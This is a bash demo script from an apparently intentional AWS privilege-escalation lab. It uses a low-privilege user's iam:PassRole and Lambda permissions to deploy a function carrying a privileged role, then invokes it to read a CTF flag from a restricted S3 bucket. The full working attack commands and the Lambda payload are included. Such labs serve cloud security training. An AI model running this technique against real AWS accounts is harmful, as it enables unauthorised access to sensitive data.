#!/bin/bash

# Demo script for iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction to S3 bucket access
# This scenario demonstrates how a user with PassRole, CreateFunction, and InvokeFunction
# can pass a privileged role to a Lambda function and use it to read from a sensitive S3 bucket

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a non-attack command with identity context
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command with identity context
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-lambda-001-to-bucket-starting-user"
TARGET_ROLE="pl-prod-lambda-001-to-bucket-target-role"
LAMBDA_FUNCTION_NAME="pl-lambda-001-to-bucket-extractor"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM PassRole + Lambda CreateFunction + InvokeFunction to S3 Bucket Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_bucket_lambda_001_iam_passrole_lambda_createfunction_lambda_invokefunction.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract starting user credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
TARGET_BUCKET=$(echo "$MODULE_OUTPUT" | jq -r '.target_bucket_name')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

if [ "$TARGET_BUCKET" == "null" ] || [ -z "$TARGET_BUCKET" ]; then
    echo -e "${RED}Error: Could not extract target bucket name from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Target bucket: $TARGET_BUCKET"
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source shared permission restriction library and activate deny policy
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# [EXPLOIT] Step 2: Configure AWS credentials with starting user and verify identity
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [EXPLOIT] Step 4: Verify we don't have S3 access yet
echo -e "${YELLOW}Step 4: Verifying we don't have access to the target bucket yet${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
echo "Attempting to list target bucket contents (should fail)..."
show_cmd "Attacker" "aws s3 ls s3://$TARGET_BUCKET/"
if aws s3 ls "s3://$TARGET_BUCKET/" --region "$AWS_REGION" &> /dev/null; then
    echo -e "${RED}Warning: Unexpectedly have S3 access already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot access bucket $TARGET_BUCKET (as expected)${NC}"
fi
echo ""

# [EXPLOIT] Step 5: Prepare Lambda function payload
echo -e "${YELLOW}Step 5: Preparing Lambda function to read S3 bucket${NC}"
echo "Creating Python function that will read flag.txt from the target S3 bucket..."

# Create Lambda function code - reads flag.txt from target bucket using the attached role
cat > /tmp/lambda_function.py << 'EOF'
import json
import boto3
import os

def lambda_handler(event, context):
    """
    Read the flag from the target S3 bucket.
    When executed with the target role attached, the Lambda has s3:GetObject
    on the sensitive bucket and can read its contents.
    """
    s3 = boto3.client('s3')
    bucket = os.environ.get('TARGET_BUCKET', event.get('bucket', ''))
    if not bucket:
        return {
            'statusCode': 400,
            'body': json.dumps({'error': 'TARGET_BUCKET not set'})
        }
    obj = s3.get_object(Bucket=bucket, Key='flag.txt')
    flag = obj['Body'].read().decode('utf-8')
    return {
        'statusCode': 200,
        'body': json.dumps({'flag': flag})
    }
EOF

# Zip the payload
cd /tmp
zip -q lambda_function.zip lambda_function.py
cd - > /dev/null

echo -e "${GREEN}✓ Lambda function payload prepared${NC}\n"

# [EXPLOIT] Step 6: Create Lambda function with target role (PassRole escalation)
echo -e "${YELLOW}Step 6: Creating Lambda function with target role (PassRole escalation)${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
echo "This is the privilege escalation vector — passing the target role to Lambda..."
TARGET_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${TARGET_ROLE}"
echo "Target Role ARN: $TARGET_ROLE_ARN"
echo "Target bucket passed as env var: $TARGET_BUCKET"

show_attack_cmd "Attacker" "aws lambda create-function --region $AWS_REGION --function-name $LAMBDA_FUNCTION_NAME --runtime python3.11 --role $TARGET_ROLE_ARN --handler lambda_function.lambda_handler --zip-file fileb:///tmp/lambda_function.zip --environment Variables={TARGET_BUCKET=$TARGET_BUCKET} --timeout 30 --output json"
LAMBDA_RESULT=$(aws lambda create-function \
    --region "$AWS_REGION" \
    --function-name "$LAMBDA_FUNCTION_NAME" \
    --runtime "python3.11" \
    --role "$TARGET_ROLE_ARN" \
    --handler "lambda_function.lambda_handler" \
    --zip-file "fileb:///tmp/lambda_function.zip" \
    --environment "Variables={TARGET_BUCKET=$TARGET_BUCKET}" \
    --timeout 30 \
    --output json)

if [ $? -eq 0 ]; then
    FUNCTION_ARN=$(echo "$LAMBDA_RESULT" | jq -r '.FunctionArn')
    echo "Function ARN: $FUNCTION_ARN"
    echo -e "${GREEN}✓ Successfully created Lambda function with target role!${NC}"
else
    echo -e "${RED}Error: Failed to create Lambda function${NC}"
    rm -f /tmp/lambda_function.py /tmp/lambda_function.zip /tmp/lambda-001-to-bucket-response.json
    exit 1
fi
echo ""

# [EXPLOIT] Step 7: Wait for Lambda function to be ready
echo -e "${YELLOW}Step 7: Waiting for Lambda function to be ready${NC}"
echo "Allowing time for Lambda function initialization..."
sleep 15
echo -e "${GREEN}✓ Lambda function ready${NC}\n"

# [EXPLOIT] Step 8: Invoke the Lambda function to read the flag from S3
echo -e "${YELLOW}Step 8: Invoking Lambda function to read flag from target S3 bucket${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
echo "Invoking function: $LAMBDA_FUNCTION_NAME"

show_attack_cmd "Attacker" "aws lambda invoke --region $AWS_REGION --function-name $LAMBDA_FUNCTION_NAME --payload '{}' /tmp/lambda-001-to-bucket-response.json --output json"
aws lambda invoke \
    --region "$AWS_REGION" \
    --function-name "$LAMBDA_FUNCTION_NAME" \
    --payload '{}' \
    /tmp/lambda-001-to-bucket-response.json \
    --output json > /dev/null

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Lambda function invoked successfully${NC}"
    echo ""
    echo "Raw response from Lambda function:"
    cat /tmp/lambda-001-to-bucket-response.json | jq '.'
    echo ""
else
    echo -e "${RED}Error: Failed to invoke Lambda function${NC}"
    rm -f /tmp/lambda_function.py /tmp/lambda_function.zip /tmp/lambda-001-to-bucket-response.json
    exit 1
fi

# [EXPLOIT] Step 9: Parse Lambda response and extract the CTF flag
echo -e "${YELLOW}Step 9: Capturing CTF flag from Lambda response${NC}"

# Parse the nested JSON response body
RESPONSE_BODY=$(cat /tmp/lambda-001-to-bucket-response.json | jq -r '.body' 2>/dev/null)

if [ -z "$RESPONSE_BODY" ] || [ "$RESPONSE_BODY" = "null" ]; then
    echo -e "${RED}Error: Could not extract response body from Lambda${NC}"
    echo "Raw response:"
    cat /tmp/lambda-001-to-bucket-response.json
    rm -f /tmp/lambda_function.py /tmp/lambda_function.zip /tmp/lambda-001-to-bucket-response.json
    exit 1
fi

FLAG_VALUE=$(echo "$RESPONSE_BODY" | jq -r '.flag' 2>/dev/null)

if [ -z "$FLAG_VALUE" ] || [ "$FLAG_VALUE" = "null" ]; then
    echo -e "${RED}Error: Could not extract flag from Lambda response body${NC}"
    echo "Response body: $RESPONSE_BODY"
    rm -f /tmp/lambda_function.py /tmp/lambda_function.zip /tmp/lambda-001-to-bucket-response.json
    exit 1
fi

show_attack_cmd "Attacker (Lambda with target role)" "# Lambda read s3://$TARGET_BUCKET/flag.txt and returned flag in response body"
echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
echo ""

# Clean up temporary files
rm -f /tmp/lambda_function.py /tmp/lambda_function.zip /tmp/lambda-001-to-bucket-response.json

# Restore helpful permissions before final summary
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (with iam:PassRole, lambda:CreateFunction, lambda:InvokeFunction)"
echo "2. Created Lambda function and passed $TARGET_ROLE to it"
echo "3. Lambda assumed the target role at invocation time, gaining s3:GetObject on the bucket"
echo "4. Invoked Lambda to read flag.txt from $TARGET_BUCKET"
echo "5. Extracted flag from Lambda response: $FLAG_VALUE"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER → (iam:PassRole + lambda:CreateFunction) → Lambda with $TARGET_ROLE"
echo "  → (lambda:InvokeFunction) → s3:GetObject flag.txt → CTF Flag"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Lambda Function: $LAMBDA_FUNCTION_NAME (still deployed — run cleanup_attack.sh)"
echo "- Function Role: $TARGET_ROLE"

echo -e "\n${RED}Warning: The Lambda function is still deployed${NC}"
echo -e "${RED}Lambda functions incur charges when invoked${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  run plabs cleanup or use the plabs TUI/CLI"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
